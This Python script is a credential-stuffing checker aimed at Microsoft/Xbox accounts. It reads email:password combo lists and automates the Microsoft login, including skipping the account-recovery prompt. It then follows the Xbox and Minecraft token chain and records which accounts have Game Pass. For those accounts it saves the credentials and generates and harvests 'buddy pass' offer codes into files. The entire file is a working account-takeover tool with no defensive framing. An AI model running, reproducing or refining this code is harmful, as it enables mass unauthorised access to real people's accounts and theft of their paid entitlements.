import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys
from datetime import datetime, timezone
from colorama import Fore
from console import utils
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs
from io import StringIO
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
def read_combos(file_path):
                combos = []
                with open(file_path, 'r') as file:
                    for line in file:
                        combo = line.strip().split(':')
                        combos.append(combo)
                return combos

          
                
def authenticate(email, password, tries = 0):
    
    try:
        session = requests.Session()
        session.verify = True
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
                
                hit = False
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    print(Fore.WHITE+f"{email}:{password} - XBOXTOKEN_SUCCESS")
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        print(Fore.WHITE+f"{email}:{password} - XSTSTOKEN_SUCCESS")
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            print(Fore.WHITE+f"{email}:{password} - ACCTOKEN_SUCCESS")
                            checkmc(session, email, password, access_token, xbox_token)
                            
            
    except:
           pass
    finally:
        session.close()            

def mc_token(session, uhs, xsts_token):
    global retries
    while True:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                
                continue
            else:
                return mc_login.json().get('access_token')
       

def get_urlPost_sFTTag(session):
    global retries
    while True: #will retry forever until it gets a working request/url.
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            match = re.match(r'.*value="(.+?)".*', text, re.S)
            if match is not None:
                sFTTag = match.group(1)
                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                if match is not None:
                    return match.group(1), sFTTag, session
        except: pass
        

def get_xbox_rps(session, email, password, urlPost, sFTTag):
            global bad, checked, cpm, twofa, retries, checked
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                print(Fore.YELLOW+f"{email}:{password} - RPS_SUCCESS")
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
def checkmc(session, email, password, token, xbox_token):
            global retries, bedrock, cpm, checked, xgp, xgpu, other
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
            if checkrq.status_code == 200:
             print(Fore.YELLOW+f"{email}:{password} - CHECKRQ_COMPLETE")
             if 'product_game_pass_ultimate' in checkrq.text:
                    
                    codes = []
                    print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass Ultimate: {email}:{password}")
                    with open(f"XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    print(Fore.YELLOW+f"{email}:{password} - XSTS_XGPC_SUCCESS")
                    js = xsts.json()
                    uhss = js['DisplayClaims']['xui'][0]['uhs']
                    xsts_token = js.get('Token')
                    print(Fore.YELLOW+f"{email}:{password} - XSTKN_XGPC_SUCCESS")
                    headers = {
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate, br, zstd",
                        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                        "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
                        "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
                        "Origin": "https://www.xbox.com",
                        "Priority": "u=1, i",
                        "Referer": "https://www.xbox.com/",
                        "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
                        "Sec-Ch-Ua-Mobile": "?0",
                        "Sec-Ch-Ua-Platform": '"Windows"',
                        "Sec-Fetch-Dest": "empty",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Site": "cross-site",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
                        "X-Ms-Api-Version": "1.0"
                    }
                    r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
                    print(Fore.YELLOW+f"{email}:{password} - REQ_BUDDYPASS")
                    if 'offerid' in r.text.lower():
                            offers = r.json()["offers"]
                            current_time = datetime.now(timezone.utc)
                            valid_offer_ids = [offer["offerId"] for offer in offers 
                            if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                            print(Fore.BLUE+f"{email}:{password} - Existing codes, saved valids")
                            with open(f"Codes.txt", 'a') as f:
                                for offer in valid_offer_ids:
                                    f.write(f"{offer}\n")
                            for offer in offers: codes.append(offer['offerId'])
                            if len(offers) < 5:
                                while True:
                                    try:
                                        r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                                        print(Fore.BLUE+f"{email}:{password} - BUDDYPASS_GENERATED")
                                        if 'offerId' in r.text:
                                            offers = r.json()["offers"]
                                            
                                            current_time = datetime.now(timezone.utc)
                                            valid_offer_ids = [offer["offerId"] for offer in offers 
                                            if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                            with open(f"Codes.txt", 'a') as f:
                                                for offer in valid_offer_ids:
                                                    f.write(f"{offer}\n")
                                            shouldContinue = False
                                            for offer in offers:
                                                if offer['offerId'] not in codes: shouldContinue = True
                                            for offer in offers: codes.append(offer['offerId'])
                                            if shouldContinue == False: break
                                        else: break
                                    except:
                                       
                                        pass
                    else:
                        while True:
                            try:
                                r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                                if 'offerId' in r.text:
                                    offers = r.json()["offers"]
                                    current_time = datetime.now(datetime.timezone.utc)
                                    valid_offer_ids = [offer["offerId"] for offer in offers 
                                    if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                    print(Fore.YELLOW+f"{email}:{password} - BUDDYPASS_GENERATED_REST")
                                    with open(f"Codes.txt", 'a') as f:
                                        for offer in valid_offer_ids:
                                            f.write(f"{offer}\n")
                                    shouldContinue = False
                                    for offer in offers:
                                        if offer['offerId'] not in codes: shouldContinue = True
                                    for offer in offers: codes.append(offer['offerId'])
                                    if shouldContinue == False: break
                                else: break
                            except:
                                
                                continue
               
            
             elif 'product_game_pass_pc' in checkrq.text:

               

                    codes = []
                    print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass: {email}:{password}")
                    with open(f"XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                          
                    js = xsts.json()
                    uhss = js['DisplayClaims']['xui'][0]['uhs']
                    xsts_token = js.get('Token')
                    headers = {
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate, br, zstd",
                        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                        "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
                        "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
                        "Origin": "https://www.xbox.com",
                        "Priority": "u=1, i",
                        "Referer": "https://www.xbox.com/",
                        "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
                        "Sec-Ch-Ua-Mobile": "?0",
                        "Sec-Ch-Ua-Platform": '"Windows"',
                        "Sec-Fetch-Dest": "empty",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Site": "cross-site",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
                        "X-Ms-Api-Version": "1.0"
                    }
                    r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
                         
                    if 'offerid' in r.text.lower():
                            offers = r.json()["offers"]
                            current_time = datetime.now(datetime.timezone.utc)
                            valid_offer_ids = [offer["offerId"] for offer in offers 
                            if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                            print(Fore.GREEN+f"{email}:{password} - Existing codes, saved valids")
                            with open(f"Codes.txt", 'a') as f:
                                for offer in valid_offer_ids:
                                    f.write(f"{offer}\n")
                            for offer in offers: codes.append(offer['offerId'])
                            if len(offers) < 5:
                                while True:
                                    try:
                                        r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                                        if 'offerId' in r.text:
                                            offers = r.json()["offers"]
                                            current_time = datetime.now(datetime.timezone.utc)
                                            valid_offer_ids = [offer["offerId"] for offer in offers 
                                            if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                            with open(f"Codes.txt", 'a') as f:
                                                for offer in valid_offer_ids:
                                                    f.write(f"{offer}\n")
                                            shouldContinue = False
                                            for offer in offers:
                                                if offer['offerId'] not in codes: shouldContinue = True
                                            for offer in offers: codes.append(offer['offerId'])
                                            if shouldContinue == False: break
                                        else: break
                                    except:
                                       
                                        continue
                    else:
                        while True:
                            try:
                                r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                                if 'offerId' in r.text:
                                    offers = r.json()["offers"]
                                    current_time = datetime.now(datetime.timezone.utc)
                                    valid_offer_ids = [offer["offerId"] for offer in offers 
                                    if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                    with open(f"Codes.txt", 'a') as f:
                                        for offer in valid_offer_ids:
                                            f.write(f"{offer}\n")
                                    shouldContinue = False
                                    for offer in offers:
                                        if offer['offerId'] not in codes: shouldContinue = True
                                    for offer in offers: codes.append(offer['offerId'])
                                    if shouldContinue == False: break
                                else: break
                            except:
                               
                                continue
               
               
                
                
             else:
                print(Fore.RED+f"Other: {email}:{password}")
                Fore.RESET()
               
combos = read_combos('combos.txt')
for email, password in combos:
   authenticate(email, password)
